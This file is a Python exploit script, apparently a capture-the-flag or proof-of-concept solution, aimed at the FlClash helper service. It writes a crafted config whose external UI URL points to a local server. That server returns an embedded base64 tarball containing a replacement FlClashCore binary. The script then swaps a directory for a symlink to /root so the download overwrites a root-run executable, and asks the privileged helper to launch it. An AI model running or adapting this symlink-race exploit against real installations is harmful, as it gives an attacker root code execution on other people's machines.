import os
import json
import time
import base64
import socket
import socketserver
import threading
import requests

HOST = "127.0.0.1"
PORT = 6666
HOMEDIR = "/dev/shm"

config = {
    #"external-contriller": "127.0.0.1:9999",
    "external-ui": "foobar/secure",
    "external-ui-url": "http://127.0.0.1:7777/payload.tar.gz",
    #"external-ui-name": "../../../../etc",
}

# cp getflag.sh FlClashCore
# chmod +x FlClashCore
# tar -acf payload.tar.gz FlClashCore
# base64 payload.tar.gz
payload_tar_gz = base64.b64decode("""
H4sIAAAAAAAAA+3OsQrCMBSF4cx9iojg4NKkNs3mUvA9YqlNITTQRtC31xYHB8GpiPB/y4Fz73BO
oQ5u8nUcW7EW9WSNmVNbo16pl35RGaGNslVZFVYfhNKlqZSQarVFb65TcqOUonPB3e7T4Prw8e/b
/U9tN/m5H/LJZ23jo/RtCFF2bboE18njrsgal2Q+xpjyudov3a9HAwAAAAAAAAAAAAAAAADEA/rU
JrAAKAAA
""")

with open(f"{HOMEDIR}/config.json", "w") as f:
    json.dump(config, f)

class MyTCPHandler(socketserver.StreamRequestHandler):
    def _send_command(self, method, data=None):
        self.wfile.write(json.dumps({"method": method, "data": data}).encode())
        self.wfile.write(b"\n")
        self.wfile.flush()
        print(self.rfile.readline())

    def handle(self):
        self._send_command("initClash", json.dumps({"home-dir": HOMEDIR}))
        print("inited")
        #os.system("/bin/bash")  # 在此等待以便 strace
        self._send_command("setupConfig", "{}")
        print(self.rfile.readline())
        time.sleep(1)
        #os.system("/bin/bash")

class HTTPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        threading.Thread(target=lambda: self.rfile.read(), daemon=True).start()
        os.rmdir(f"{HOMEDIR}/foobar/secure")
        os.rmdir(f"{HOMEDIR}/foobar")
        os.symlink("/root", f"{HOMEDIR}/foobar")
        self.wfile.write(b"HTTP/1.1 200 OK\r\n")
        self.wfile.write(b"Content-Length: %d\r\n" % (len(payload_tar_gz),))
        self.wfile.write(b"\r\n")
        self.wfile.write(payload_tar_gz)

def main():
    os.mkdir(f"{HOMEDIR}/foobar")
    os.mkdir(f"{HOMEDIR}/foobar/secure")

    def start():
        print(requests.post(
            "http://127.0.0.1:47890/start",
            json={"path": "/root/secure/FlClashCore", "arg": f"{PORT}"}
        ).text)

    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server, \
            socketserver.TCPServer((HOST, 7777), HTTPHandler) as httpserver:
        threading.Thread(target=lambda: httpserver.handle_request()).start()
        start()
        server.handle_request()

    print(requests.get("http://127.0.0.1:47890/logs").text.strip())
    print(requests.post("http://127.0.0.1:47890/stop").text.strip())
    start()
    print(requests.get("http://127.0.0.1:47890/logs").text.strip())

main()
